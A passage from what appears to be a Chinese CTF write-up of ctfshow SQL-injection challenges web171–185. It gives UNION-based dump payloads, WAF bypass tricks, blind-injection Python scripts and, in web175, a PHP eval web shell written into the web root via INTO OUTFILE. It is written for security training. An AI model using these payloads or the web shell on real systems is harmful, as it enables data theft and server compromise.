-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+
爆破列名：
1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user&#39;--+
爆破数据：
1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code></pre>

<p>有一个问题就是，这里用的是1而不是-1，居然能够爆出信息。可能是这里没有限定输出数据的量，所以能够用1，而不是用-1。</p>
<h4 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h4><p>跟上一题差不多，只不过这里把flag换到另一个表<code>ctfshow_user2</code>里了，而且字段数改为2了</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">爆破表名
-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+
爆破列名
-1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user2&#39;--+
爆破flag
-1&#39; union select 1,2,group_concat(password) FROM ctfshow_user2 where username&#x3D;&#39;flag&#39;--+</code></pre>

<h4 id="web173-回显检测"><a href="#web173-回显检测" class="headerlink" title="web173(回显检测)"></a>web173(回显检测)</h4><p>返回逻辑多了限制，回显不能有flag，但是直接查flag回显是ctfshow</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//检查结果是否有flag</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span></code></pre>

<pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select 1,2,password from ctfshow_user3 where username &#x3D; &#39;flag&#39; --+
1&#39; union select 1,2,group_concat(&#39;+&#39;,password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+</code></pre>

<p>或者使用其他绕过姿势  <strong>编码绕过,base64，hex</strong></p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union select 1,2,to_base64(password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+
-1&#39; union select 1,to_base64(username),hex(password) from ctfshow_user3 --+</code></pre>

<h4 id="web174-replace"><a href="#web174-replace" class="headerlink" title="web174(replace)"></a>web174(replace)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//检查结果是否有flag</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|[0-9]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
   </code></pre>

<p>限制了数字和<code>flag</code></p>
<p>替换：将数据to_base64加密，然后将里面所有的数字用replace()替换</p>
<p>替换方式：<code>1 @A</code>,<code>2 @B</code> <code>3 @C</code>等等</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&quot;1&quot;,&quot;@A&quot;),&quot;2&quot;,&quot;@B&quot;),&quot;3&quot;,&quot;@C&quot;),&quot;4&quot;,&quot;@D&quot;),&quot;5&quot;,&quot;@E&quot;),&quot;6&quot;,&quot;@F&quot;),&quot;7&quot;,&quot;@G&quot;),&quot;8&quot;,&quot;@H&quot;),&quot;9&quot;,&quot;@I&quot;),&quot;0&quot;,&quot;@J&quot;) from ctfshow_user4 where username &#x3D; &#39;flag&#39; --+</code></pre>

<p>然后使用脚本解密得到flag</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
 
flag64 <span class="token operator">=</span> <span class="token string">" "</span>
 
flag <span class="token operator">=</span> flag64<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@A"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@B"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@C"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@D"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@E"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@F"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@G"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@H"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@I"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@J"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
 
<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<h4 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//检查结果是否有flag</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
      </code></pre>

<p>过滤ASCII0-127的字符</p>
<p>1.将flag查询结果传入1.txt，访问url&#x2F;1.txt文件得flag</p>
<p>查询语句：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union select 1,password from ctfshow_user5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt&#39;--</code></pre>

<p>2.将一句话木马传入1.php，使用蚁剑链接后，访问数据库，查询flag</p>
<p>查询语句：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">99&#39; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</code></pre>

<p>burp-decoder—&gt;base64加密一句话木马，用url加密表示</p>
<p>payload:</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">99&#39; union select 1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;) into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php</code></pre>

<h4 id="web176-大小写绕过"><a href="#web176-大小写绕过" class="headerlink" title="web176(大小写绕过)"></a>web176(大小写绕过)</h4><p>ban了select，使用大小写绕过</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union seLect 1,2,password from ctfshow_user--+</code></pre>

<h4 id="web177-绕过空格"><a href="#web177-绕过空格" class="headerlink" title="web177(&#x2F;**&#x2F;绕过空格)"></a>web177(&#x2F;**&#x2F;绕过空格)</h4><p>把空格给过滤掉了，就相当于把注释符– 给过滤掉了，我们可以用&#x2F;**&#x2F;或者是%0a（回车）来绕过空格的过滤，%23（#）来绕过注释符的过滤</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user&#x2F;**&#x2F;where&#x2F;**&#x2F;username&#x3D;&#39;flag&#39;%23</code></pre>

<h4 id="web178-090a0b0c0d绕空格"><a href="#web178-090a0b0c0d绕空格" class="headerlink" title="web178(%090a0b0c0d绕空格*)"></a>web178(%090a0b0c0d绕空格*)</h4><p>因为已经过滤了<code>*</code>，那么就需要用其它字符来绕过空格，可以选择</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">%</span><span class="token number">09</span> tab<span class="token operator">%</span><span class="token number">0</span>a<span class="token operator">%</span><span class="token number">0</span>b<span class="token operator">%</span><span class="token number">0</span>c<span class="token operator">%</span><span class="token number">0</span>d </code></pre>

<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;union%09select%0a1,2,password%0bfrom%0cctfshow_user%23</code></pre>

<p>万能密码</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;or%0a1&#x3D;1%231’or&#39;1&#39;&#x3D;&#39;1&#39;%23</code></pre>

<h4 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h4><p>把<code>%09 %0a %0b %0d</code>过滤了，可以用<code>%0c</code></p>
<p>把上面的那个全换成<code>%0c</code></p>
<h4 id="web180-闭合绕过-23"><a href="#web180-闭合绕过-23" class="headerlink" title="web180(闭合绕过%23)"></a>web180(闭合绕过%23)</h4><p>过滤了空格和%23 ，空格可用<code>%0c</code>，%23用<code>or&#39;1&#39;=&#39;&#39;</code></p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0cusername&#x3D;&#39;flag&#39;or&#39;1&#39;&#x3D;&#39;</code></pre>

<pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;%0cor%0cusername%0clike%0c&#39;flag</code></pre>

<pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#39;or&#39;1&#39;&#x3D;&#39;1&#39;--%0c</code></pre>

<h4 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h4><p>同上</p>
<h4 id="web182-like模糊匹配"><a href="#web182-like模糊匹配" class="headerlink" title="web182(like模糊匹配)"></a>web182(like模糊匹配)</h4><p>增加了flag过滤。like可以模糊匹配，或者同上万能密码</p>
<p><code>%0c</code>在本题依旧可用。</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;||(username)like&#39;%fla%</code></pre>

<p>like可以用两个通配符（不区分大小写）：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>%</code></td>
<td>匹配任何数目的字符，甚至包括零字符</td>
</tr>
<tr>
<td><code>_</code></td>
<td>只能匹配一种字符</td>
</tr>
</tbody></table>
<h4 id="web183-布尔盲注"><a href="#web183-布尔盲注" class="headerlink" title="web183(布尔盲注)"></a>web183(布尔盲注)</h4><p>查询语句</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//拼接sql语句查找指定ID用户</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(pass) from "</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span>
      </code></pre>

<p>返回逻辑</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//对传入的参数进行了过滤</span>
  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
      </code></pre>

<p>查询结果</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//返回用户表的记录总数</span>
      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      </code></pre>

<p>waf又增加了一些，题目也有变化了。查询到的结果会返回到下面第三个灰块那里。</p>
<p>select不能用，就只能选择布尔盲注或者时间盲注了。</p>
<p>这题的解法是在已知表名的情况下实现的，再结合模糊匹配like或者正则匹配regexp。<br>写脚本前先测试一下语句是否能正常执行，可以的话，再写到脚本里。</p>
<p>因为每次查询记录总数都是1条，就是我们要找的flag，所以页面固定会出现$user_count &#x3D; 1;，可以用布尔盲注。</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where&#96;pass&#96;like&#39;ctfshow&#123;%&#39;</code></pre>

<pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where(substr(&#96;pass&#96;,1,1)regexp(&#39;a&#39;))</code></pre>

<p><img src="web183.png" loading="lazy"></p>
<p>Payload：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where&#96;pass&#96;like&#39;ctfshow&#123;%&#39;</code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">'https://b2eacc14-603c-45c4-bc2a-0ce02478cc81.challenge.ctf.show/select-waf.php'</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
flagstr <span class="token operator">=</span> <span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># (1, 46)</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"`ctfshow_user`where`pass`like\'ctfshow&#123;&#125;%\'"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> j<span class="token punctuation">)</span>
            <span class="token comment"># 'tableName': f'`ctfshow_user`where(substr(`pass`,&#123;i&#125;,1)regexp('&#123;j&#125;'))'</span>
        <span class="token punctuation">&#125;</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment"># 有并发数量限制的题目，就睡一段时间</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>
</code></pre>

<h4 id="web184-right-join-having"><a href="#web184-right-join-having" class="headerlink" title="web184(right join   having)"></a>web184(right join   having)</h4><p>返回逻辑</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//对传入的参数进行了过滤</span>
  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
</code></pre>

<p><code>where</code>、<code>&#39; &quot;</code>、反引号被过滤了，但是本题没有过滤空格。</p>
<p><strong>方法一：（用right join绕过过滤）</strong></p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96; as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(46))</code></pre>

<p>RIGHT JOIN 关键字从右表（table2）返回所有的行，即使左表（table1）中没有匹配。如果左表中没有匹配，则结果为 NULL。</p>
<p>[right join菜鸟教程](<a target="_blank" rel="noopener" href="https://www.runoob.com/sql/sql-join-right.html">SQL RIGHT JOIN 关键字 | 菜鸟教程 (runoob.com)</a>)</p>
<p>这里是分别将ctfshow_uer重命名为a和b，接着在b中进行筛选，然后用<code>right join</code>将b中筛选出来的值与a表的值进行匹配。</p>
<p>这里用<code>$user_count = 43;</code>作为筛选条件。</p>
<p>Y4tacker师傅的代码</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"https://214a3dd9-ba25-480b-bdc0-0f33a1c754d8.challenge.ctf.show/select-waf.php"</span>

flag <span class="token operator">=</span> <span class="token string">'ctfshow&#123;'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp(char(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">)))"</span></span>
        <span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"."</span><span class="token punctuation">:</span>
                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>
                    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>

</code></pre>

<p><strong>方法二：（where用having代替，’ “可以用 ()+Hex代替）</strong></p>
<p>查看官方文档，看看select语法。发现having和where可以替换，但是having语句有使用条件。</p>
<blockquote>
<p>一个HAVING子句必须位于GROUP BY子句之后，并位于ORDER BY子句之前。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/sql/sql-having.html">SQL HAVING 子句</a></p>
<p><img src="web184.png" loading="lazy"></p>
<p><strong>十六进制</strong>：可以前面加x，后面用引号包裹或者0x；也可以和算数运算结合表示数字。</p>
<p><img src="web184_2.png" loading="lazy"></p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;ctfshow_user group by pass having pass like 0x63746673686f777b25  #ctfshow&#123;%</code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
url<span class="token operator">=</span><span class="token string">"http://24873af7-39c6-4235-85e2-f6433b80f182.challenge.ctf.show/select-waf.php"</span>

flagstr<span class="token operator">=</span><span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span>   <span class="token comment">#40</span>
flag<span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token operator">+</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">#print(data)</span>
        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment">#有并发数量限制的，就睡一段时间</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
            flag<span class="token operator">+=</span>x
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow&#123;"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span>
</code></pre>

<h4 id="web185-true绕过数字"><a href="#web185-true绕过数字" class="headerlink" title="web185(true绕过数字)"></a>web185(true绕过数字)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//对传入的参数进行了过滤</span>
  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
</code></pre>

<p>数字被ban了</p>
<p><img src="web185.png" loading="lazy"></p>
<p><strong>方法一</strong>：可以使用concat来拼接字符串</p>
<p><img src="web185_2.png" loading="lazy"></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token keyword">import</span> string


<span class="token keyword">def</span> <span class="token function">formatString</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    temp <span class="token operator">=</span> <span class="token string">"concat("</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        tip <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">if</span> x <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>
            tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tip <span class="token operator">=</span> <span class="token number">1</span>
            temp <span class="token operator">+=</span> <span class="token string">"char("</span>
            tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
        <span class="token keyword">if</span> tmp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            temp <span class="token operator">+=</span> <span class="token string">"false"</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            temp_d <span class="token operator">=</span> <span class="token string">"("</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>
                temp_d <span class="token operator">+=</span> <span class="token string">"true+"</span>
            temp_d <span class="token operator">=</span> temp_d<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span>
            <span class="token keyword">if</span> tip <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
                temp_d <span class="token operator">+=</span> <span class="token string">")"</span>
            temp <span class="token operator">+=</span> temp_d
        temp <span class="token operator">+=</span> <span class="token string">","</span>
    temp <span class="token operator">=</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span>
    <span class="token keyword">return</span> temp


<span class="token comment"># print(formatString("0x63746673686f777b"))</span>

url <span class="token operator">=</span> <span class="token string">"https://8ea77825-d310-4375-b330-8826bf8db1a3.challenge.ctf.show/select-waf.php"</span>
<span class="token comment"># dic的顺序可以改一下！我是懒得改了！改顺序可以提高效率！！！</span>
dic <span class="token operator">=</span> <span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span>
flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user group by pass having pass regexp(&#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>formatString<span class="token punctuation">(</span>flag <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment"># print(data)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
